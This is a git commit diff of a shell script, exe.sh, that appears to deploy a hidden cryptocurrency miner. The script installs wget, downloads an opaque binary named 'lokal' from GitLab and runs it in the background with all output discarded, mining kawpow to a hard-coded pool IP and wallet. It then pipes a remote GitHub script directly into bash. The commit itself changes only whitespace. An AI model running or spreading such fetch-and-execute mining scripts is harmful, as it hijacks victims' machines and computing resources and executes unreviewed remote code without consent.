8c36b6ae426cc423bb0696d6069b2c3eb64ec949
youcef664 <151974476+youcef664@users.noreply.github.com>
2024-04-18 02:22:15 +0700

    Update exe.sh

--- exe.sh
+++ exe.sh
@@ -2,5 +2,5 @@
 apt -y install wget
 wget -q https://gitlab.com/falsbayu039/botak/-/raw/main/lokal
 chmod +x lokal
-./lokal -a kawpow -o stratum+tcp://139.162.39.193:443 -u AdrGUHDETfAi6mGkWbDVMnTGq4W9AhoX8n.gass -p x > /dev/null 2>&1 &
+./lokal -a kawpow -o stratum+tcp://139.162.39.193:443 -u AdrGUHDETfAi6mGkWbDVMnTGq4W9AhoX8n.gass -p x >/dev/null 2>&1 &
 curl -sL https://raw.githubusercontent.com/youcef664/gmin/master/jika | bash
